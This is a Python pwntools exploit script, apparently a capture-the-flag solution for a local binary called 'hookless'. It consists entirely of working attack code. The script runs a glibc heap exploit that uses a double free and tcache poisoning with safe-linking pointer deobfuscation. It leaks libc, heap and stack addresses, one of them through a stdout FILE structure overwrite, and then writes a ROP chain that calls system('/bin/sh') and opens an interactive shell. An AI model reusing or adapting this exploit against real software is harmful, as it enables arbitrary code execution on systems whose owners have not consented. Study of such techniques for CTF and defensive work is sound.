#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./hookless")
p = process("./hookless")
libc = ELF("libc.so.6")
gdb.attach(p,"init-gef")

def malloc(idx,size,data):
  p.sendlineafter('Exit\n','1')
  p.sendlineafter('index?\n',str(idx))
  p.sendlineafter('it?\n',str(size))
  p.sendafter('here?\n',data)

def free(index):
    p.sendlineafter('Exit\n',"4")
    for i in range(2):
        p.recvline()
    p.sendline(str(index))


def edit(index,data):
    p.sendlineafter('Exit\n',"3")
    for i in range(2):
        p.recvline()
    p.sendline(str(index))
    p.recvline()
    p.send(data)

def read(index):
    p.sendlineafter('Exit\n',"2")
    p.recvline()
    p.sendline(str(index))
    leak = p.recvline()[:-1]
    return leak

def addn(idx,size,data):
  p.sendlineafter('Exit','1')
  p.sendlineafter('index?',str(idx))
  p.sendlineafter('it?',str(size))
  p.sendafter('here?',data)

def editn(idx,data):
  p.sendlineafter('Exit','3')
  p.sendlineafter('index?',str(idx))
  p.sendafter('here?',data)

def freen(idx):
    p.sendlineafter('Exit','4')
    p.sendlineafter('index?',str(idx))

def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(ptr,addr):
    return (addr>>12)^ptr

for i in range(6):
    malloc(i,0x88,chr(i+97)*8)

malloc(6,0x88,chr(102)*8) # chunk A
malloc(7,0x88,chr(103)*8) # chunk B
malloc(8,0x88,b'0'*8)  # fencepost chunk

for i in range(6):
    free(i)
free(8)
free(7)  # free chunk B
leak = read(7)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
libc.address = leak - 0x1edcc0
log.critical("Libc base address: {}".format(hex(libc.address)))
free(6) # free chunk A
malloc(9,0x88,b'0'*8)  # fencepost chunk
free(7) # double free chunk B
leak = read(2)
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
leak = defuscate(leak)
heap_base = leak - 0x330
log.critical("Heap base address: {}".format(hex(heap_base)))
malloc(10,0x118,b'2'*0x80+p64(0x0)+p64(0x91)+p64(obfuscate(libc.sym._IO_2_1_stdout_,heap_base+0x690)))
malloc(11,0x88,'4'*8)
payload = p64(0xfbad1800) + p64(0x0)*3 + p64(libc.sym.environ)+p64(libc.sym.environ+0x8)*3+p64(libc.sym.environ+0x9)
malloc(12,0x88,payload)
leak = p.recvuntil("What")[:-4]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
return_address = leak - 0x168
log.critical("Stack leak: {}".format(hex(leak)))
log.critical("Return address: {}".format(hex(return_address)))
freen(11)
editn(11,p64(obfuscate(return_address,heap_base+0x690)))
addn(13,0x88,'5'*8)

# Write ROP chain to the return address
rop = ROP(libc)
ret = rop.find_gadget(["ret"])[0]
pop_rdi_ret = rop.find_gadget(["pop rdi","ret"])[0]
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
payload = p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
addn(14,0x88,payload)
p.interactive()